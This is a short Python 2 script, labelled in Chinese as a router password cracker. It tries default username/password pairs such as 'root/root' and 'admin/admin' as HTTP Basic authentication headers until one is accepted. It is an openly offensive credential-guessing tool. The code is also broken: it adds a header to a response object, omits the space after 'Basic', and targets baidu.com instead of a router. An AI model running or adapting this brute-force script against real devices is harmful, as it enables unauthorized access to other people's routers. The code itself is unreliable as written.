# -*- coding: UTF-8 -*-
'''破解路由器密码
firefox + tamper data
http://www.cnblogs.com/virusdefender/p/3655885.html
'''

import base64
import urllib

password_dic = [["root", "root"], ["admin", "admin"]]
request = urllib.urlopen('http://www.baidu.com')

for item in password_dic:
	psw_base64 = "Basic" + base64.b64encode(item[0] + ":" + item[1])
	request.add_header('Authorization', psw_base64)
	try:
		response = urllib.urlopen(request)
		print("correct! username:%s,pwd:%s" % (item[0], item[1]))
		break
	except urllib.HTTPError:
		print("error")
